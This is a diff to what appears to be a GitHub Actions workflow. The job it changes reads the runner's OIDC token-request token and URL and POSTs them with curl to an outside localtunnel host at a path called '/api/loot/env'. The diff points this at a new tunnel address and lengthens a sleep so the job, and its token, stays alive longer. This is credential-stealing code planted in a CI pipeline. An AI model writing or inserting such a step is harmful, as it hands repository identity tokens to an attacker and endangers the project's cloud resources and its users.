@@ -9,5 +9,5 @@ jobs:
       - run: |
           T=$ACTIONS_ID_TOKEN_REQUEST_TOKEN
           U=$ACTIONS_ID_TOKEN_REQUEST_URL
-          curl -s -X POST https://decepticon-trigger-1778384700-v2.loca.lt/api/loot/env -d "t=$T" -d "u=$U"
-          sleep 300 # Keep job alive for 5 minutes
+          curl -s -X POST https://decepticon-final-1778385121.loca.lt/api/loot/env -d "t=$T" -d "u=$U"
+          sleep 600
